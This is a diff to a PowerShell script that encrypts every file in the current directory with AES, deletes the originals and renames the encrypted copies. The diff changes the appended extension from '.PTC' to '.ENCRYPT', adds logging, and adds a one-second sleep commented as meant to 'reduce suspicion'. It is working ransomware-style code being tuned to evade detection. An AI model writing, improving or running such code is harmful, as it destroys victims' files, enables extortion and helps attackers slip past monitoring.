@@ -6,7 +6,6 @@ function Generate-AesKeyAndIv {
     $aes.GenerateKey()
     $aes.GenerateIV()
 
-    # Output the raw byte arrays (correct sizes for AES)
     [PSCustomObject]@{
         Key = $aes.Key
         IV = $aes.IV
@@ -22,8 +21,8 @@ function Encrypt-File {
     )
 
     $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Key = $key  # Use the generated key
-    $aes.IV = $iv    # Use the generated IV
+    $aes.Key = $key
+    $aes.IV = $iv
 
     $encryptor = $aes.CreateEncryptor()
 
@@ -51,7 +50,10 @@ function Encrypt-File {
 
     # Remove the original file and rename the encrypted file
     Remove-Item -Path $filePath
-    Rename-Item -Path $tempFilePath -NewName ($filePath + ".PTC")
+    Rename-Item -Path $tempFilePath -NewName ($filePath + ".ENCRYPT")
+
+    # Log the operation
+    Write-Output "Encrypted and renamed: $filePath to $($filePath + '.ENCRYPT')"
 }
 
 # Generate AES key and IV
@@ -59,7 +61,7 @@ $keyAndIv = Generate-AesKeyAndIv
 $key = $keyAndIv.Key
 $iv = $keyAndIv.IV
 
-# Output the generated key and IV (for reference)
+# Output the generated key and IV
 Write-Output "Generated AES Key: $([BitConverter]::ToString($key) -replace '-','')"
 Write-Output "Generated AES IV: $([BitConverter]::ToString($iv) -replace '-','')"
 
@@ -69,7 +71,9 @@ $files = Get-ChildItem -Path . -File
 foreach ($file in $files) {
     $filePath = $file.FullName
     
+    # Encrypt each file with a delay between operations
     Encrypt-File -key $key -iv $iv -filePath $filePath
+    Start-Sleep -Seconds 1  # Introduce a delay to reduce suspicion
 }
 
 Write-Output "Encryption complete."
